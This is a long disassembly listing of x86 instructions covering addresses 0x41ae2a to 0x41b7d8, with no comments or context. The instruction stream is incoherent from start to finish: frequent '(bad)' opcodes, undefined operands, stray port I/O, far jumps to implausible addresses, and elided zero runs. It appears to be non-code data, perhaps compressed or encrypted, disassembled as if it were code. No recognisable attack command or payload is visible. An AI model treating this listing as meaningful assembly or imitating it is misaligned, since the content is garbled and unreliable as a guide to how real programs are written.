  41ae2a:	mov    ebx,0xbf92f16f
  41ae2f:	cwde   
  41ae30:	(bad)  
  41ae31:	out    dx,al
  41ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae33:	retf   0x7331
  41ae36:	daa    
  41ae37:	mov    eax,0x5abc3c16
  41ae3c:	add    ebp,DWORD PTR [ebx+0x61]
  41ae3f:	dec    eax
  41ae40:	neg    ch
  41ae42:	repz xor edi,DWORD PTR [edx]
  41ae45:	mov    dl,0x7b
  41ae47:	shr    BYTE PTR [ebx-0x44],0x68
  41ae4b:	out    dx,al
  41ae4c:	jns    0x41aec0
  41ae4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4f:	mov    ebx,0xe7ff2d12
  41ae54:	sub    bh,ah
  41ae56:	popa   
  41ae57:	inc    ecx
  41ae58:	repnz test eax,0xb521c8b8
  41ae5e:	cmp    bl,ah
  41ae60:	pusha  
  41ae61:	jecxz  0x41aede
  41ae63:	dec    eax
  41ae64:	ror    DWORD PTR [ecx],0x11
  41ae67:	jmp    0x88c498aa
  41ae6c:	mov    esi,ebx
  41ae6e:	js     0x41ae60
  41ae70:	add    DWORD PTR [eax],0xffffffaa
  41ae73:	xchg   ebp,eax
  41ae74:	xchg   esp,eax
  41ae75:	shl    ebx,1
  41ae77:	out    dx,al
  41ae78:	jb     0x41ae1a
  41ae7a:	fucomip st,st(0)
  41ae7c:	sbb    cl,BYTE PTR [eax-0x21]
  41ae7f:	mov    esi,0xf1d41f8e
  41ae84:	add    bl,0xd4
  41ae87:	jmp    0x41ae88
  41ae89:	into   
  41ae8a:	and    esp,DWORD PTR [edi+0x3c]
  41ae8d:	xchg   BYTE PTR [esi],bh
  41ae8f:	cmp    al,0xd3
  41ae91:	mov    cs:0x9786a658,eax
  41ae97:	jo     0x41aeb6
  41ae99:	ficom  WORD PTR [edi+0x372a87d4]
  41ae9f:	ret    0xe606
  41aea2:	mov    esp,0x6a2d893a
  41aea7:	lahf   
  41aea8:	or     BYTE PTR [edi+ebx*8-0x2c152618],al
  41aeaf:	mov    cl,0xcf
  41aeb1:	stos   BYTE PTR es:[edi],al
  41aeb2:	inc    ebx
  41aeb3:	pop    ebp
  41aeb4:	dec    ecx
  41aeb5:	push   edx
  41aeb6:	mov    edx,0x20afe8d1
  41aebb:	jl     0x41aeae
  41aebd:	inc    ebp
  41aebe:	fwait
  41aebf:	std    
  41aec0:	cmp    eax,0x4b4ce2e3
  41aec5:	xchg   ebp,eax
  41aec6:	(bad)  
  41aec7:	and    BYTE PTR [ecx+ecx*8-0x4d],bh
  41aecb:	dec    eax
  41aecc:	xchg   ebx,eax
  41aecd:	popf   
  41aece:	sbb    al,0x4d
  41aed0:	and    BYTE PTR [edi-0x57e35b97],dl
  41aed6:	jp     0x41af07
  41aed8:	push   ds
  41aed9:	jne    0x41af2b
  41aedb:	add    eax,DWORD PTR [eax+0x45]
  41aede:	test   eax,eax
  41aee0:	mov    ?,WORD PTR [edi]
  41aee2:	fwait
  41aee3:	aad    0xfc
  41aee5:	cmp    al,0x28
  41aee7:	sub    eax,DWORD PTR fs:[edx-0x23]
  41aeeb:	mov    WORD PTR [eax],?
  41aeed:	pop    ecx
  41aeee:	cmp    al,0xb1
  41aef0:	rcr    BYTE PTR [edx-0x2238a607],cl
  41aef6:	jmp    0xdbcbc44d
  41aefb:	loope  0x41aeaa
  41aefd:	int3   
  41aefe:	ins    BYTE PTR es:[edi],dx
  41aeff:	fld    QWORD PTR [eax+0x3a]
  41af02:	dec    ebp
  41af03:	cmp    eax,0xa018f224
  41af08:	push   eax
  41af09:	(bad)  
  41af0a:	mov    cl,0xc
  41af0c:	mov    al,0x91
  41af0e:	jb     0x41aeca
  41af10:	and    al,0x0
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x866e44ee
  41af82:	pop    esi
  41af83:	and    DWORD PTR [ebx+0x1e],edx
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x93000001
  41af8d:	push   ss
  41af8e:	push   cs
  41af8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af90:	dec    esp
  41af91:	xor    bh,bh
  41af93:	sub    eax,0xda33b1c8
  41af98:	test   BYTE PTR [ebx+0x6b],ch
  41af9b:	add    BYTE PTR [eax+0x38],al
  41af9e:	mov    BYTE PTR [esi],cl
  41afa0:	sahf   
  41afa1:	ss add eax,0x5222860a
  41afa7:	pusha  
  41afa8:	cmp    al,0xae
  41afaa:	push   0x24ccad0f
  41afaf:	sbb    cl,0xbc
  41afb2:	inc    ebp
  41afb3:	add    DWORD PTR [edx],esi
  41afb5:	adc    BYTE PTR [edx-0x1750a014],bl
  41afbb:	inc    eax
  41afbc:	shr    DWORD PTR [ebx-0x49],cl
  41afbf:	adc    eax,0xefe6c8bf
  41afc4:	sbb    al,0x8
  41afc6:	xlat   BYTE PTR ds:[ebx]
  41afc7:	cld    
  41afc8:	or     eax,0xd6a2d99a
  41afcd:	mov    esp,0xdf51c8f3
  41afd2:	das    
  41afd3:	retf   0x71d2
  41afd6:	loopne 0x41af5a
  41afd8:	data16 xor BYTE PTR [ebx+eax*2],cl
  41afdc:	retf   
  41afdd:	and    cl,BYTE PTR ds:0xa46491d7
  41afe3:	sbb    ah,BYTE PTR [edx-0x5492b108]
  41afe9:	add    BYTE PTR [eax+0x16e4e8a5],ch
  41afef:	adc    al,BYTE PTR [edi-0x76]
  41aff2:	or     al,0xf7
  41aff4:	fld    QWORD PTR [ebp+0xe3f011b]
  41affa:	inc    ecx
  41affb:	in     al,dx
  41affc:	test   BYTE PTR [ebx],0x62
  41afff:	stos   DWORD PTR es:[edi],eax
  41b000:	add    eax,0x91ed3e3
  41b005:	jae    0x41b07b
  41b007:	(bad)  
  41b008:	mov    BYTE PTR [ebx],al
  41b00a:	scas   al,BYTE PTR es:[edi]
  41b00b:	rol    cl,1
  41b00d:	xchg   ebx,eax
  41b00e:	pop    esp
  41b00f:	dec    ebp
  41b010:	ret    0xadc8
  41b013:	jl     0x41afde
  41b015:	ins    BYTE PTR es:[edi],dx
  41b016:	pop    esp
  41b017:	das    
  41b018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b019:	test   DWORD PTR [eax-0x3ae5d0d9],ecx
  41b01f:	mov    ds:0xd2795aef,al
  41b024:	xlat   BYTE PTR ds:[ebx]
  41b025:	inc    ebx
  41b026:	push   ecx
  41b027:	test   BYTE PTR [eax-0x796224e2],cl
  41b02d:	fisub  WORD PTR [edi+0x7309b6ae]
  41b033:	gs out 0x37,al
  41b036:	and    ecx,DWORD PTR ds:0xa3386ef8
  41b03c:	push   esi
  41b03d:	sub    ebp,eax
  41b03f:	cdq    
  41b040:	repnz addr16 mov ch,0xc5
  41b044:	mov    ecx,0x978a628f
  41b049:	mov    cl,BYTE PTR [ecx+0x134abea4]
  41b04f:	sub    DWORD PTR [esi],ebx
  41b051:	sbb    DWORD PTR [edx-0x7f],0x3ea55ac0
  41b058:	xchg   esi,eax
  41b059:	push   esi
  41b05a:	or     bl,bl
  41b05c:	push   ds
  41b05d:	stc    
  41b05e:	jmp    0x1dc5:0x512eaf94
  41b065:	mov    dl,0xcb
  41b067:	and    edx,DWORD PTR [esi]
  41b069:	xor    cl,BYTE PTR [edi]
  41b06b:	nop
  41b06c:	xchg   edi,eax
  41b06d:	pop    ss
  41b06e:	mov    bl,0xa4
  41b070:	sbb    DWORD PTR [ebp-0x32a9df19],edi
  41b076:	cwde   
  41b077:	inc    esp
  41b078:	je     0x41b09b
  41b07a:	das    
  41b07b:	xchg   ebp,eax
  41b07c:	adc    eax,0xe4e77a7
  41b081:	test   esp,0x54326f85
  41b087:	xchg   edi,eax
  41b088:	sub    DWORD PTR [ecx-0x5351ec83],edx
  41b08e:	dec    esi
  41b08f:	sub    bl,cl
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xfad7caf
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x6c000001
  41b10d:	call   0x660e:0x4cd6391
  41b114:	es add al,0xfd
  41b117:	inc    ebx
  41b118:	push   esp
  41b119:	add    bh,ah
  41b11b:	mov    edx,0x3ef6df14
  41b120:	add    al,0x60
  41b122:	xor    ah,bl
  41b124:	push   ss
  41b125:	and    eax,0x90b0be93
  41b12a:	mov    edi,0xf9665794
  41b12f:	aad    0xe7
  41b131:	popa   
  41b132:	mov    dl,BYTE PTR [ebx-0x7904582d]
  41b138:	mov    ah,0x36
  41b13a:	push   edx
  41b13b:	add    edx,eax
  41b13d:	cwde   
  41b13e:	in     al,0xf7
  41b140:	jmp    0x2b8cd17d
  41b145:	push   ebp
  41b146:	dec    edi
  41b147:	inc    edi
  41b148:	fsubp  st(1),st
  41b14a:	inc    esi
  41b14b:	inc    esi
  41b14c:	call   0x43bb76ee
  41b151:	mov    bl,0x6a
  41b153:	lock or DWORD PTR [eax-0x627c3eb8],edx
  41b15a:	or     al,0x58
  41b15c:	xchg   esp,eax
  41b15d:	loope  0x41b17b
  41b15f:	ror    esp,0x2
  41b162:	mov    dh,0x66
  41b164:	mov    cl,BYTE PTR [eax+edi*2+0x64e77ae8]
  41b16b:	in     eax,0xc8
  41b16d:	sub    DWORD PTR [edx+0x2c3c1fa],esi
  41b173:	jle    0x41b1ca
  41b175:	aaa    
  41b176:	es and eax,0x7dd96e2c
  41b17c:	push   ebp
  41b17d:	icebp  
  41b17e:	xchg   ebx,eax
  41b17f:	jo     0x41b1ed
  41b181:	(bad)  
  41b182:	cmp    eax,0x14ed9177
  41b187:	jbe    0x41b164
  41b189:	add    eax,0xd2220137
  41b18e:	adc    BYTE PTR [edx-0x3a],0xbb
  41b192:	mov    DWORD PTR [edx-0x64e99c6],edi
  41b198:	int3   
  41b199:	fdivr  QWORD PTR [ebx]
  41b19b:	fwait
  41b19c:	ret    0x5aa7
  41b19f:	repnz add eax,0x4b3ecf47
  41b1a5:	arpl   ax,sp
  41b1a7:	add    esp,DWORD PTR [esi-0x2fe07f9b]
  41b1ad:	jae    0x41b1da
  41b1af:	idiv   DWORD PTR [ebx]
  41b1b1:	pop    esp
  41b1b2:	popa   
  41b1b3:	int3   
  41b1b4:	pop    esi
  41b1b5:	clc    
  41b1b6:	jne    0x41b153
  41b1b8:	xor    eax,0xc0482e3c
  41b1bd:	aas    
  41b1be:	and    DWORD PTR [esi+0x39],ebx
  41b1c1:	xchg   ebp,eax
  41b1c2:	imul   eax,DWORD PTR [edx+eax*2],0x6b308461
  41b1c9:	aad    0x19
  41b1cb:	sti    
  41b1cc:	popf   
  41b1cd:	dec    ecx
  41b1ce:	push   ebx
  41b1cf:	mov    bl,0x9f
  41b1d1:	jb     0x41b248
  41b1d3:	mov    ds:0x53b46508,al
  41b1d8:	pop    ebp
  41b1d9:	sub    DWORD PTR [ebp-0x41],esp
  41b1dc:	pop    ecx
  41b1dd:	sbb    DWORD PTR [edx+0x69],ebx
  41b1e0:	cmc    
  41b1e1:	std    
  41b1e2:	hlt    
  41b1e3:	xchg   ebp,eax
  41b1e4:	(bad)  
  41b1e5:	inc    DWORD PTR ds:0x51019f39
  41b1eb:	and    BYTE PTR ss:0x5cbf6872,cl
  41b1f2:	pushf  
  41b1f3:	ror    DWORD PTR [ecx-0x47052486],1
  41b1f9:	out    0x2c,eax
  41b1fb:	inc    ebp
  41b1fc:	(bad)  
  41b1fe:	mov    bl,0x2a
  41b200:	out    0x1e,eax
  41b202:	xlat   BYTE PTR ds:[ebx]
  41b203:	fwait
  41b204:	lock mov eax,DWORD PTR [edi]
  41b207:	ins    DWORD PTR es:[edi],dx
  41b208:	inc    edi
  41b209:	inc    ebp
  41b20a:	mov    al,ds:0x8069aa69
  41b20f:	leave  
  41b210:	xchg   BYTE PTR [eax],al
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     bh,ah
  41b281:	dec    edi
  41b282:	data16 and bl,BYTE PTR [ebp+0x20]
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    eax,0x3e000001
  41b28d:	scas   al,BYTE PTR es:[edi]
  41b28e:	dec    esp
  41b28f:	mov    esi,0x8bfa4fcf
  41b294:	xor    eax,0xd3388040
  41b299:	cld    
  41b29a:	sub    ch,BYTE PTR [ebp+0x57f82974]
  41b2a0:	sub    al,0x3d
  41b2a2:	cmp    DWORD PTR [ebx],esp
  41b2a4:	je     0x41b30b
  41b2a6:	fidiv  DWORD PTR [eax-0x5ab6d862]
  41b2ac:	fild   QWORD PTR [ebx]
  41b2ae:	pop    ss
  41b2af:	xor    BYTE PTR [ebp-0x46559df9],dl
  41b2b5:	scas   eax,DWORD PTR es:[edi]
  41b2b6:	(bad)  
  41b2b7:	out    0xcd,al
  41b2b9:	mov    bl,0x2a
  41b2bb:	pusha  
  41b2bc:	inc    edx
  41b2bd:	jecxz  0x41b26c
  41b2bf:	inc    esi
  41b2c0:	outs   dx,DWORD PTR ds:[esi]
  41b2c1:	cmp    al,0x71
  41b2c3:	mov    dh,0x4
  41b2c5:	dec    ebx
  41b2c6:	and    cl,BYTE PTR [edx]
  41b2c8:	inc    BYTE PTR [ecx-0x323d0f76]
  41b2ce:	out    0x71,eax
  41b2d0:	sahf   
  41b2d1:	scas   eax,DWORD PTR es:[edi]
  41b2d2:	aad    0xed
  41b2d4:	fcmovnbe st,st(1)
  41b2d6:	cmc    
  41b2d7:	jmp    0x4d7d:0x104183b8
  41b2de:	sar    BYTE PTR [eax-0x4c],1
  41b2e1:	mov    es:0xe7bc2015,eax
  41b2e7:	jecxz  0x41b2e2
  41b2e9:	popa   
  41b2ea:	pop    edi
  41b2eb:	cdq    
  41b2ec:	ja     0x41b29c
  41b2ee:	fisubr WORD PTR [ebx]
  41b2f0:	push   ecx
  41b2f1:	xchg   edi,eax
  41b2f2:	adc    al,0xef
  41b2f4:	pop    eax
  41b2f5:	mov    ebx,0x49025617
  41b2fa:	xlat   BYTE PTR ds:[ebx]
  41b2fb:	loop   0x41b35f
  41b2fd:	sti    
  41b2fe:	adc    bl,BYTE PTR [esi]
  41b300:	mov    bl,0xec
  41b302:	mov    al,ds:0x65abefa7
  41b307:	sar    DWORD PTR [ebp+0x32],cl
  41b30a:	and    al,0xf
  41b30c:	imul   esp,esi,0x5eca125d
  41b312:	push   ebp
  41b313:	push   es
  41b314:	fldenv [ebx]
  41b316:	(bad)  
  41b317:	out    0x87,al
  41b319:	pop    ds
  41b31a:	fidivr WORD PTR fs:[esi]
  41b31d:	cmp    DWORD PTR [ebp+0x61c0ea5d],esi
  41b323:	add    ecx,DWORD PTR [ecx+0x72]
  41b326:	pusha  
  41b327:	push   0xffffffc9
  41b329:	ret    0x9fe9
  41b32c:	adc    BYTE PTR [ecx],ah
  41b32e:	pop    eax
  41b32f:	and    esi,DWORD PTR [ecx]
  41b331:	mov    ds:0xfd15095d,eax
  41b336:	mov    esp,ecx
  41b338:	xor    ebp,DWORD PTR [ebx-0x6e]
  41b33b:	inc    edi
  41b33c:	arpl   WORD PTR [ecx],ax
  41b33e:	in     eax,0x60
  41b340:	test   eax,0xb49a4a57
  41b345:	test   eax,0xa971d935
  41b34a:	xchg   esi,eax
  41b34b:	adc    al,0x4c
  41b34d:	pusha  
  41b34e:	and    BYTE PTR [esi+0x6f],0xe0
  41b352:	cmp    edi,DWORD PTR [edx-0x62c2a631]
  41b358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b359:	lea    edi,[edi+ebx*1+0x71]
  41b35d:	push   ebp
  41b35e:	sub    eax,0xeff83584
  41b363:	mov    bh,0x28
  41b365:	and    cl,ah
  41b367:	imul   ecx,esi,0xffffffcc
  41b36a:	ds das 
  41b36c:	call   0xf84f:0x2e69b983
  41b373:	dec    DWORD PTR [edi+0x35]
  41b376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b377:	mov    ds:0xe6582f8d,al
  41b37c:	mov    dh,0x81
  41b37e:	xchg   ebp,eax
  41b37f:	jmp    0x7d0:0x70570a2f
  41b386:	and    eax,eax
  41b388:	lods   eax,DWORD PTR ds:[esi]
  41b389:	xchg   ebp,eax
  41b38a:	mov    ecx,DWORD PTR [ebx+0xc416bc0]
  41b390:	add    BYTE PTR gs:[eax],al
	...
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	sar    BYTE PTR [edi],cl
  41b402:	les    ebx,FWORD PTR [edx+eiz*2]
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR ds:0x30000001,al
  41b40d:	into   
  41b40e:	retf   0x5fe1
  41b411:	dec    ebx
  41b412:	in     al,0x1f
  41b414:	jns    0x41b3bb
  41b416:	dec    edi
  41b417:	fiadd  DWORD PTR [ecx+0x4d]
  41b41a:	fadd   QWORD PTR [ecx-0x15]
  41b41d:	ds nop
  41b41f:	push   ebx
  41b420:	sub    DWORD PTR [edi],ebx
  41b422:	rcl    BYTE PTR [esi+0x5dfbdee7],0x7e
  41b429:	dec    ecx
  41b42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b42b:	ds pop es
  41b42d:	jae    0x41b4a4
  41b42f:	leave  
  41b430:	xchg   ebp,edx
  41b432:	paddsw mm2,QWORD PTR [ebp+0x69]
  41b436:	jmp    0x41b441
  41b438:	mov    ds:0x893b5515,al
  41b43d:	or     DWORD PTR [edi+0x4d5d1906],0xffffffb1
  41b444:	lea    eax,[edi+0x16]
  41b447:	cmp    DWORD PTR [ebp+0x5eedb0b5],0x68
  41b44e:	xor    ch,0x19
  41b451:	enter  0xf07f,0x61
  41b455:	shr    BYTE PTR [ebx],1
  41b457:	aam    0xef
  41b459:	jmp    0x9651:0x4a325868
  41b460:	xor    DWORD PTR [edx],esi
  41b462:	cmp    al,0x70
  41b464:	inc    ebp
  41b465:	jp     0x41b483
  41b467:	scas   eax,DWORD PTR es:[edi]
  41b468:	pop    esp
  41b469:	push   ebx
  41b46a:	xchg   esi,eax
  41b46b:	xor    eax,0x88a5952e
  41b470:	ss jbe 0xd1f8f2a4
  41b477:	cmp    ebx,DWORD PTR [edx-0x5e]
  41b47a:	mov    esi,cs
  41b47c:	aas    
  41b47d:	das    
  41b47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b47f:	xchg   edi,eax
  41b480:	div    DWORD PTR [ecx+edx*1]
  41b483:	popa   
  41b484:	and    bh,BYTE PTR [ebp+edx*4+0x11b09104]
  41b48b:	jnp    0x41b46c
  41b48d:	mov    WORD PTR [edi-0x1b9e6c00],ss
  41b493:	aaa    
  41b494:	push   edx
  41b495:	mov    edi,0xa7a3697a
  41b49a:	cmp    DWORD PTR [edi-0x6c],edx
  41b49d:	loop   0x41b438
  41b49f:	sbb    bl,bh
  41b4a1:	jge    0x41b4bb
  41b4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4a4:	push   ecx
  41b4a5:	cmp    al,0x17
  41b4a7:	scas   al,BYTE PTR es:[edi]
  41b4a8:	push   edx
  41b4a9:	repnz inc ecx
  41b4ab:	mov    ecx,0x467c9377
  41b4b0:	adc    DWORD PTR [ebx-0x40],ebp
  41b4b3:	add    BYTE PTR [edi+0x50],0xc0
  41b4b7:	mov    edi,0x6130cffd
  41b4bc:	push   esp
  41b4bd:	xor    al,0x24
  41b4bf:	ins    DWORD PTR es:[edi],dx
  41b4c0:	pop    es
  41b4c1:	mov    esp,0xb80bd00e
  41b4c6:	add    ecx,DWORD PTR [edi]
  41b4c8:	fisttp DWORD PTR [edx]
  41b4ca:	cmp    dl,BYTE PTR [ebx]
  41b4cc:	mov    dh,0x87
  41b4ce:	test   eax,0x19e5eca4
  41b4d3:	pop    ebx
  41b4d4:	push   cs
  41b4d5:	xor    al,0x7a
  41b4d7:	dec    ebp
  41b4d8:	(bad)  
  41b4d9:	out    0x70,al
  41b4db:	pop    ebp
  41b4dc:	mov    bl,BYTE PTR [ebx]
  41b4de:	mov    bl,0xc6
  41b4e0:	repnz les edx,FWORD PTR [edi]
  41b4e3:	leave  
  41b4e4:	mov    bh,0x7a
  41b4e6:	sub    eax,DWORD PTR [ecx]
  41b4e8:	mov    dh,0x4
  41b4ea:	scas   al,BYTE PTR es:[edi]
  41b4eb:	js     0x41b4c2
  41b4ed:	jb     0x41b560
  41b4ef:	inc    edi
  41b4f0:	sbb    BYTE PTR [ebx],0x69
  41b4f3:	push   0xa9334cc2
  41b4f8:	pop    esp
  41b4f9:	dec    ebx
  41b4fa:	jle    0x41b4cf
  41b4fc:	mul    dl
  41b4fe:	and    bh,BYTE PTR [ebp+0x39ee1995]
  41b504:	lahf   
  41b505:	mov    ebp,0x82cc0de4
  41b50a:	test   DWORD PTR [edx-0x3b],esi
  41b50d:	jp     0x41b562
  41b50f:	mov    ebx,0x8f
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	std    
  41b581:	push   edi
  41b582:	jae    0x41b538
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0xff000001,al
  41b58d:	js     0x41b5d5
  41b58f:	mov    ebx,0x7ece3189
  41b594:	(bad)
  41b597:	bound  esi,QWORD PTR [ecx]
  41b599:	push   cs
  41b59a:	and    BYTE PTR [ecx-0x1b],dl
  41b59d:	push   ds
  41b59e:	push   ebx
  41b59f:	neg    DWORD PTR [edx+0x3a]
  41b5a2:	jo     0x41b60e
  41b5a4:	push   ds
  41b5a5:	ja     0x41b5fc
  41b5a7:	jmp    0x9010:0xa0d65420
  41b5ae:	mov    ch,dl
  41b5b0:	pop    ds
  41b5b1:	fdivr  DWORD PTR [eax-0x4bf698a2]
  41b5b7:	dec    ebx
  41b5b8:	loopne 0x41b595
  41b5ba:	sbb    ah,BYTE PTR [edi-0x24e365b3]
  41b5c0:	pop    edx
  41b5c1:	sbb    al,0xfd
  41b5c3:	push   0xde1b03df
  41b5c8:	mov    gs,WORD PTR [esi]
  41b5ca:	outs   dx,BYTE PTR ds:[esi]
  41b5cb:	xchg   esp,eax
  41b5cc:	cs xchg ebx,eax
  41b5ce:	push   ecx
  41b5cf:	inc    edi
  41b5d0:	jne    0x41b5e7
  41b5d2:	adc    ebx,DWORD PTR [edx+0x55]
  41b5d5:	mov    ecx,0xec9ffe38
  41b5da:	je     0x41b5bf
  41b5dc:	sub    al,0x88
  41b5de:	xchg   ebx,eax
  41b5df:	in     eax,0x7c
  41b5e1:	xchg   ecx,eax
  41b5e2:	cmc    
  41b5e3:	leave  
  41b5e4:	(bad)  
  41b5e5:	rcl    DWORD PTR [eax+0x257836c8],1
  41b5eb:	pop    ebx
  41b5ec:	iret   
  41b5ed:	cmp    al,0xa6
  41b5ef:	shr    DWORD PTR [edi],0xfc
  41b5f2:	sub    ah,BYTE PTR [ebp-0x46]
  41b5f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f6:	popa   
  41b5f7:	pop    esp
  41b5f8:	sbb    ch,BYTE PTR ds:0x340522ec
  41b5fe:	mov    ah,BYTE PTR [ebx]
  41b600:	and    BYTE PTR [edi],bl
  41b602:	sub    DWORD PTR [esi-0x292e0432],0xffffffe8
  41b609:	jmp    0xdeb1:0x84f5e90
  41b610:	mov    ebx,0x6b4cdd20
  41b615:	dec    edx
  41b616:	stos   DWORD PTR es:[edi],eax
  41b617:	loopne 0x41b648
  41b619:	(bad)  
  41b61a:	cwde   
  41b61b:	into   
  41b61c:	mov    ch,bl
  41b61e:	sub    BYTE PTR [eax+ebx*2-0x860e86e],bh
  41b625:	in     al,dx
  41b626:	xor    BYTE PTR [eax-0x5a],bl
  41b629:	add    eax,DWORD PTR [edi-0x49]
  41b62c:	adc    eax,0x9c02d273
  41b631:	dec    edi
  41b632:	arpl   ax,cx
  41b634:	cli    
  41b635:	test   al,0xa1
  41b637:	jge    0x41b67f
  41b639:	or     edi,DWORD PTR [ebx]
  41b63b:	test   DWORD PTR [esi-0x4cab0c52],ecx
  41b641:	mov    al,ds:0x3d4a0195
  41b646:	popa   
  41b647:	jg     0x41b60e
  41b649:	ret    
  41b64a:	inc    ebp
  41b64b:	mov    edi,0x4ca710fa
  41b650:	mov    bh,0x8a
  41b652:	imul   edx,DWORD PTR [bp+di],0xb6090084
  41b659:	fwait
  41b65a:	aam    0x91
  41b65c:	add    DWORD PTR ds:0xe849fd27,eax
  41b662:	adc    eax,0xe65adda2
  41b667:	xor    dl,BYTE PTR [esi-0x35361486]
  41b66d:	jmp    0x41b6d4
  41b66f:	mov    esp,0xee517f
  41b674:	mov    ch,0xff
  41b676:	in     eax,dx
  41b677:	xor    eax,0xc3e83250
  41b67c:	dec    esi
  41b67d:	push   ecx
  41b67e:	cmp    DWORD PTR [ebx],ebp
  41b680:	jg     0x41b6b9
  41b682:	fidivr DWORD PTR ds:0x683531d4
  41b688:	out    0x6e,al
  41b68a:	aaa    
  41b68b:	push   edi
  41b68c:	das    
  41b68d:	loopne 0x41b663
  41b68f:	fcom   st(0)
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	(bad)  
  41b701:	cld    
  41b702:	fidivr DWORD PTR [ebx+0x1236c]
  41b708:	add    eax,0x27000001
  41b70d:	sbb    BYTE PTR [ebx+0x1085c480],bh
  41b713:	xlat   BYTE PTR ds:[ebx]
  41b714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b715:	ret    
  41b716:	push   cs
  41b717:	aam    0x51
  41b719:	mov    edi,0x7d06d1bb
  41b71e:	sub    BYTE PTR [esi],ch
  41b720:	mov    BYTE PTR [edi-0x44],bl
  41b723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b724:	loop   0x41b6bc
  41b726:	mov    ch,0xfd
  41b728:	xchg   DWORD PTR [ecx-0x2d],ecx
  41b72b:	popf   
  41b72c:	fld    TBYTE PTR [eax+0x21d3b3f3]
  41b732:	mov    eax,esp
  41b734:	popf   
  41b735:	int    0x85
  41b737:	pusha  
  41b738:	mov    ebx,0xc4f53cc8
  41b73d:	mov    bl,0xe8
  41b73f:	jle    0x41b6f9
  41b741:	pop    edx
  41b742:	jp     0x41b78b
  41b744:	pop    ds
  41b745:	mov    ebp,0x5618a867
  41b74a:	fcom   QWORD PTR [edi-0xf]
  41b74d:	inc    esp
  41b74e:	mov    ah,0x6c
  41b751:	push   esp
  41b752:	das    
  41b753:	nop
  41b754:	test   eax,0x7f30b359
  41b75a:	aaa    
  41b75b:	data16 int3 
  41b75d:	xchg   edi,eax
  41b75e:	cli    
  41b75f:	aaa    
  41b760:	jge    0x41b727
  41b762:	jo     0x41b709
  41b764:	mov    bh,0x24
  41b766:	loope  0x41b78f
  41b768:	mov    edi,0xf413a668
  41b76d:	test   eax,0x121fa880
  41b772:	adc    edi,DWORD PTR [ebx]
  41b774:	das    
  41b775:	ja     0x41b7d0
  41b777:	jno    0x41b773
  41b779:	push   esp
  41b77a:	adc    esp,DWORD PTR [edi-0x1f]
  41b77d:	xor    al,0x18
  41b77f:	or     ch,ch
  41b781:	call   0x34ca:0x2003fa3f
  41b788:	mov    cl,BYTE PTR [ecx+0x5c]
  41b78b:	adc    al,0x7
  41b78d:	dec    eax
  41b78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b78f:	pop    ds
  41b790:	imul   ecx,DWORD PTR [esi],0xffffff91
  41b793:	std    
  41b794:	call   0xf618c150
  41b799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79a:	rol    BYTE PTR [esi-0x4618fbf0],1
  41b7a0:	out    0x8e,al
  41b7a2:	aas    
  41b7a3:	push   ds
  41b7a4:	push   ss
  41b7a5:	sub    DWORD PTR [ebp+0x68],esi
  41b7a8:	out    0x52,eax
  41b7aa:	mov    edi,0xf7fd3fb2
  41b7af:	sub    edx,DWORD PTR [eax-0x2f08e336]
  41b7b5:	(bad)  
  41b7b6:	fimul  WORD PTR [edi]
  41b7b8:	and    al,0x87
  41b7ba:	in     al,dx
  41b7bb:	xlat   BYTE PTR ds:[ebx]
  41b7bc:	aam    0x44
  41b7be:	mov    ch,0x68
  41b7c0:	icebp  
  41b7c1:	in     eax,dx
  41b7c2:	icebp  
  41b7c3:	pushf  
  41b7c4:	int3   
  41b7c5:	enter  0xecc1,0x73
  41b7c9:	rol    DWORD PTR [ecx+0x17439db9],cl
  41b7cf:	mov    al,0x1b
  41b7d1:	(bad)  
  41b7d2:	outs   dx,DWORD PTR ds:[esi]
  41b7d3:	dec    esi
  41b7d4:	sbb    cl,dh
  41b7d6:	xor    al,0xee
  41b7d8:	jb     0x41b7d7
